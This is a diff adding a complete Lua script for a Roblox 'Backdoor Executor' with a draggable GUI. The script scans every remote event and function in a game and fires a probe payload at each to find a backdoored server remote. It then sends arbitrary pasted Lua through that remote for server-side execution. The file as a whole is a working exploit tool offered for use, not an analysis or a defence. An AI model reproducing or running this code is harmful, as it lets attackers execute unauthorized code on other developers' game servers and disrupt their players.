@@ -1,0 +1,481 @@
+-- Roblox Backdoor Executor
+-- Based on LALOL Hub Backdoor methodology
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local UserInputService = game:GetService("UserInputService")
+local HttpService = game:GetService("HttpService")
+local TweenService = game:GetService("TweenService")
+local player = Players.LocalPlayer
+
+-- Remove existing GUI
+for _, gui in pairs(player:WaitForChild("PlayerGui"):GetChildren()) do
+    if gui.Name == "BackdoorExecutor" then
+        gui:Destroy()
+    end
+end
+if game:GetService("CoreGui"):FindFirstChild("BackdoorExecutor") then
+    game:GetService("CoreGui").BackdoorExecutor:Destroy()
+end
+
+-- Create GUI
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "BackdoorExecutor"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = game:GetService("CoreGui")
+
+-- Main Frame
+local MainFrame = Instance.new("Frame")
+MainFrame.Name = "MainFrame"
+MainFrame.Size = UDim2.new(0, 450, 0, 280)
+MainFrame.Position = UDim2.new(0.5, -225, 0.5, -140)
+MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+MainFrame.BorderSizePixel = 0
+MainFrame.Parent = ScreenGui
+
+local Corner = Instance.new("UICorner")
+Corner.CornerRadius = UDim.new(0, 8)
+Corner.Parent = MainFrame
+
+-- UI Stroke
+local Stroke = Instance.new("UIStroke")
+Stroke.Color = Color3.fromRGB(0, 150, 255)
+Stroke.Thickness = 2
+Stroke.Parent = MainFrame
+
+-- Title Bar
+local TitleBar = Instance.new("Frame")
+TitleBar.Size = UDim2.new(1, 0, 0, 35)
+TitleBar.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
+TitleBar.BorderSizePixel = 0
+TitleBar.Parent = MainFrame
+
+local TitleCorner = Instance.new("UICorner")
+TitleCorner.CornerRadius = UDim.new(0, 8)
+TitleCorner.Parent = TitleBar
+
+local TitleText = Instance.new("TextLabel")
+TitleText.Size = UDim2.new(1, -80, 1, 0)
+TitleText.Position = UDim2.new(0, 15, 0, 0)
+TitleText.BackgroundTransparency = 1
+TitleText.Text = "🔥 Backdoor Executor By elikinder"
+TitleText.TextColor3 = Color3.fromRGB(255, 255, 255)
+TitleText.TextSize = 16
+TitleText.Font = Enum.Font.GothamBold
+TitleText.TextXAlignment = Enum.TextXAlignment.Left
+TitleText.Parent = TitleBar
+
+-- Close Button
+local CloseBtn = Instance.new("TextButton")
+CloseBtn.Size = UDim2.new(0, 30, 0, 30)
+CloseBtn.Position = UDim2.new(1, -35, 0, 2.5)
+CloseBtn.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
+CloseBtn.Text = "X"
+CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseBtn.TextSize = 14
+CloseBtn.Font = Enum.Font.GothamBold
+CloseBtn.Parent = TitleBar
+
+local CloseCorner = Instance.new("UICorner")
+CloseCorner.CornerRadius = UDim.new(0, 6)
+CloseCorner.Parent = CloseBtn
+
+-- Status Label
+local StatusLabel = Instance.new("TextLabel")
+StatusLabel.Size = UDim2.new(1, -20, 0, 25)
+StatusLabel.Position = UDim2.new(0, 10, 0, 45)
+StatusLabel.BackgroundTransparency = 1
+StatusLabel.Text = "Status: Ready - Click Inject to scan"
+StatusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+StatusLabel.TextSize = 12
+StatusLabel.Font = Enum.Font.Gotham
+StatusLabel.TextXAlignment = Enum.TextXAlignment.Left
+StatusLabel.Parent = MainFrame
+
+-- Script Input Box
+local InputFrame = Instance.new("Frame")
+InputFrame.Size = UDim2.new(0, 430, 0, 120)
+InputFrame.Position = UDim2.new(0, 10, 0, 75)
+InputFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+InputFrame.BorderSizePixel = 0
+InputFrame.Parent = MainFrame
+
+local InputCorner = Instance.new("UICorner")
+InputCorner.CornerRadius = UDim.new(0, 6)
+InputCorner.Parent = InputFrame
+
+local TextBox = Instance.new("TextBox")
+TextBox.Size = UDim2.new(1, -20, 1, -20)
+TextBox.Position = UDim2.new(0, 10, 0, 10)
+TextBox.BackgroundTransparency = 1
+TextBox.Text = ""
+TextBox.PlaceholderText = "-- Paste your script here\n-- Example: require(12345678)\n-- Or any Lua code"
+TextBox.TextColor3 = Color3.fromRGB(200, 200, 200)
+TextBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
+TextBox.TextSize = 13
+TextBox.Font = Enum.Font.Code
+TextBox.TextXAlignment = Enum.TextXAlignment.Left
+TextBox.TextYAlignment = Enum.TextYAlignment.Top
+TextBox.MultiLine = true
+TextBox.ClearTextOnFocus = false
+TextBox.TextWrapped = true
+TextBox.Parent = InputFrame
+
+-- Button Container
+local ButtonContainer = Instance.new("Frame")
+ButtonContainer.Size = UDim2.new(0, 430, 0, 45)
+ButtonContainer.Position = UDim2.new(0, 10, 0, 205)
+ButtonContainer.BackgroundTransparency = 1
+ButtonContainer.Parent = MainFrame
+
+-- Inject Button
+local InjectBtn = Instance.new("TextButton")
+InjectBtn.Size = UDim2.new(0, 200, 0, 40)
+InjectBtn.Position = UDim2.new(0, 0, 0, 0)
+InjectBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
+InjectBtn.Text = "🔌 Inject (Scan)"
+InjectBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+InjectBtn.TextSize = 14
+InjectBtn.Font = Enum.Font.GothamBold
+InjectBtn.Parent = ButtonContainer
+
+local InjectCorner = Instance.new("UICorner")
+InjectCorner.CornerRadius = UDim.new(0, 6)
+InjectCorner.Parent = InjectBtn
+
+-- Execute Button
+local ExecuteBtn = Instance.new("TextButton")
+ExecuteBtn.Size = UDim2.new(0, 200, 0, 40)
+ExecuteBtn.Position = UDim2.new(0, 230, 0, 0)
+ExecuteBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 80)
+ExecuteBtn.Text = "▶ Execute"
+ExecuteBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+ExecuteBtn.TextSize = 14
+ExecuteBtn.Font = Enum.Font.GothamBold
+ExecuteBtn.Parent = ButtonContainer
+
+local ExecuteCorner = Instance.new("UICorner")
+ExecuteCorner.CornerRadius = UDim.new(0, 6)
+ExecuteCorner.Parent = ExecuteBtn
+
+-- Info Label
+local InfoLabel = Instance.new("TextLabel")
+InfoLabel.Size = UDim2.new(1, -20, 0, 20)
+InfoLabel.Position = UDim2.new(0, 10, 0, 255)
+InfoLabel.BackgroundTransparency = 1
+InfoLabel.Text = "Press Ctrl+I to toggle | Drag title to move"
+InfoLabel.TextColor3 = Color3.fromRGB(100, 100, 100)
+InfoLabel.TextSize = 11
+InfoLabel.Font = Enum.Font.Gotham
+InfoLabel.Parent = MainFrame
+
+-- Notification System
+local NotifFrame = Instance.new("Frame")
+NotifFrame.Size = UDim2.new(0, 300, 0, 60)
+NotifFrame.Position = UDim2.new(0.5, -150, 1, 80)
+NotifFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+NotifFrame.BorderSizePixel = 0
+NotifFrame.Parent = ScreenGui
+
+local NotifCorner = Instance.new("UICorner")
+NotifCorner.CornerRadius = UDim.new(0, 8)
+NotifCorner.Parent = NotifFrame
+
+local NotifText = Instance.new("TextLabel")
+NotifText.Size = UDim2.new(1, -20, 1, 0)
+NotifText.Position = UDim2.new(0, 10, 0, 0)
+NotifText.BackgroundTransparency = 1
+NotifText.Text = ""
+NotifText.TextColor3 = Color3.fromRGB(255, 255, 255)
+NotifText.TextSize = 14
+NotifText.Font = Enum.Font.GothamBold
+NotifText.TextWrapped = true
+NotifText.Parent = NotifFrame
+
+-- Variables
+local backdoorRemote = nil
+local isScanning = false
+local uiVisible = true
+local alphabet = {}
+for i = 65, 90 do table.insert(alphabet, string.char(i)) end -- A-Z
+for i = 97, 122 do table.insert(alphabet, string.char(i)) end -- a-z
+
+-- Dragging
+local dragging = false
+local dragStart = nil
+local startPos = nil
+
+TitleBar.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true
+        dragStart = input.Position
+        startPos = MainFrame.Position
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+        local delta = input.Position - dragStart
+        MainFrame.Position = UDim2.new(
+            startPos.X.Scale, startPos.X.Offset + delta.X,
+            startPos.Y.Scale, startPos.Y.Offset + delta.Y
+        )
+    end
+end)
+
+UserInputService.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = false
+    end
+end)
+
+-- Notification Function
+local function notify(message, success)
+    NotifText.Text = message
+    NotifFrame.BackgroundColor3 = success and Color3.fromRGB(0, 150, 80) or Color3.fromRGB(200, 60, 60)
+    
+    TweenService:Create(NotifFrame, TweenInfo.new(0.3), {
+        Position = UDim2.new(0.5, -150, 1, -80)
+    }):Play()
+    
+    task.delay(3, function()
+        TweenService:Create(NotifFrame, TweenInfo.new(0.3), {
+            Position = UDim2.new(0.5, -150, 1, 80)
+        }):Play()
+    end)
+end
+
+-- Toggle UI with Ctrl+I
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if not gameProcessed and input.KeyCode == Enum.KeyCode.I and UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
+        uiVisible = not uiVisible
+        MainFrame.Visible = uiVisible
+    end
+end)
+
+-- Close Button
+CloseBtn.MouseButton1Click:Connect(function()
+    ScreenGui:Destroy()
+end)
+
+-- Generate Random Name
+local function generateName(length)
+    local name = ""
+    for i = 1, length do
+        name = name .. alphabet[math.random(1, #alphabet)]
+    end
+    return name
+end
+
+-- Fire Remote Helper
+local function fireBackdoor(remote, code)
+    if remote:IsA("RemoteEvent") then
+        remote:FireServer(code)
+    elseif remote:IsA("RemoteFunction") then
+        task.spawn(function()
+            pcall(function()
+                remote:InvokeServer(code)
+            end)
+        end)
+    end
+end
+
+-- Filter Remote (skip known safe remotes)
+local function isValidRemote(remote)
+    if not remote then return false end
+    
+    local name = remote.Name
+    local parent = remote.Parent
+    
+    -- Skip Adonis
+    if name == "__FUNCTION" or remote:FindFirstChild("__FUNCTION") then
+        return false
+    end
+    
+    -- Skip HD Admin
+    if parent and parent.Name == "Signals" and parent.Parent and parent.Parent.Name == "HDAdminClient" then
+        return false
+    end
+    
+    -- Skip Chat Events
+    if parent and parent.Name == "DefaultChatSystemChatEvents" then
+        return false
+    end
+    
+    -- Skip RobloxReplicatedStorage
+    if remote:FindFirstAncestor("RobloxReplicatedStorage") then
+        return false
+    end
+    
+    return true
+end
+
+-- Scan for Backdoor (LALOL Method)
+local function scanBackdoor()
+    if isScanning then return end
+    isScanning = true
+    
+    StatusLabel.Text = "Status: Scanning for backdoor..."
+    StatusLabel.TextColor3 = Color3.fromRGB(255, 200, 100)
+    InjectBtn.Text = "Scanning..."
+    
+    local testCodes = {}
+    local remotes = {}
+    
+    -- Collect all remotes
+    for _, obj in pairs(game:GetDescendants()) do
+        if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) and isValidRemote(obj) then
+            -- Generate unique test code
+            local code
+            repeat
+                code = generateName(15)
+            until not testCodes[code]
+            
+            testCodes[code] = obj
+            table.insert(remotes, {remote = obj, code = code})
+        end
+    end
+    
+    if #remotes == 0 then
+        StatusLabel.Text = "Status: No remotes found"
+        StatusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+        InjectBtn.Text = "🔌 Inject (Scan)"
+        isScanning = false
+        notify("No remotes found to test", false)
+        return false
+    end
+    
+    -- Send test payloads
+    for _, data in pairs(remotes) do
+        local payload = "local m=Instance.new('Model',workspace)m.Name='" .. data.code .. "'"
+        fireBackdoor(data.remote, payload)
+    end
+    
+    -- Wait and check for response
+    local found = false
+    local startTime = tick()
+    
+    while tick() - startTime < 3 do
+        for code, remote in pairs(testCodes) do
+            if workspace:FindFirstChild(code) then
+                -- Found backdoor!
+                backdoorRemote = remote
+                found = true
+                
+                -- Clean up test model
+                pcall(function()
+                    workspace[code]:Destroy()
+                end)
+                
+                break
+            end
+        end
+        
+        if found then break end
+        task.wait(0.1)
+    end
+    
+    -- Clean up any remaining test models
+    for code, _ in pairs(testCodes) do
+        local obj = workspace:FindFirstChild(code)
+        if obj then
+            pcall(function() obj:Destroy() end)
+        end
+    end
+    
+    isScanning = false
+    InjectBtn.Text = "🔌 Inject (Scan)"
+    
+    if found then
+        StatusLabel.Text = "Status: Injected! Remote: " .. backdoorRemote.Name
+        StatusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+        notify("✅ Injected successfully!", true)
+        return true
+    else
+        StatusLabel.Text = "Status: No backdoor found"
+        StatusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+        notify("❌ Injection failed :(", false)
+        return false
+    end
+end
+
+-- Execute Script
+local function executeScript()
+    local code = TextBox.Text
+    
+    if code == "" or code == "-- Paste your script here" then
+        notify("Please enter code to execute", false)
+        return
+    end
+    
+    if not backdoorRemote then
+        notify("Please inject first!", false)
+        StatusLabel.Text = "Status: Not injected!"
+        StatusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+        return
+    end
+    
+    -- Replace %username% with actual username
+    code = code:gsub("%%username%%", player.Name)
+    
+    -- Execute
+    local success, err = pcall(function()
+        fireBackdoor(backdoorRemote, code)
+    end)
+    
+    if success then
+        notify("✅ Executed!", true)
+        StatusLabel.Text = "Status: Executed successfully"
+        StatusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+    else
+        notify("❌ Execution failed: " .. tostring(err):sub(1, 50), false)
+        StatusLabel.Text = "Status: Execution failed"
+        StatusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+    end
+end
+
+-- Button Connections
+InjectBtn.MouseButton1Click:Connect(function()
+    -- Button animation
+    TweenService:Create(InjectBtn, TweenInfo.new(0.1), {Size = UDim2.new(0, 195, 0, 38)}):Play()
+    task.wait(0.1)
+    TweenService:Create(InjectBtn, TweenInfo.new(0.1), {Size = UDim2.new(0, 200, 0, 40)}):Play()
+    
+    scanBackdoor()
+end)
+
+ExecuteBtn.MouseButton1Click:Connect(function()
+    -- Button animation
+    TweenService:Create(ExecuteBtn, TweenInfo.new(0.1), {Size = UDim2.new(0, 195, 0, 38)}):Play()
+    task.wait(0.1)
+    TweenService:Create(ExecuteBtn, TweenInfo.new(0.1), {Size = UDim2.new(0, 200, 0, 40)}):Play()
+    
+    executeScript()
+end)
+
+-- Hover effects
+local function addHover(button, originalColor)
+    button.MouseEnter:Connect(function()
+        TweenService:Create(button, TweenInfo.new(0.2), {
+            BackgroundColor3 = originalColor:Lerp(Color3.fromRGB(255, 255, 255), 0.2)
+        }):Play()
+    end)
+    
+    button.MouseLeave:Connect(function()
+        TweenService:Create(button, TweenInfo.new(0.2), {
+            BackgroundColor3 = originalColor
+        }):Play()
+    end)
+end
+
+addHover(InjectBtn, Color3.fromRGB(0, 120, 255))
+addHover(ExecuteBtn, Color3.fromRGB(0, 200, 80))
+addHover(CloseBtn, Color3.fromRGB(255, 80, 80))
+
+-- Initial notification
+task.delay(0.5, function()
+    notify("🔥 Executor loaded! Press Ctrl+I to toggle", true)
+end)
+
+print("Backdoor Executor loaded!")
+print("Press Ctrl+I to toggle UI")
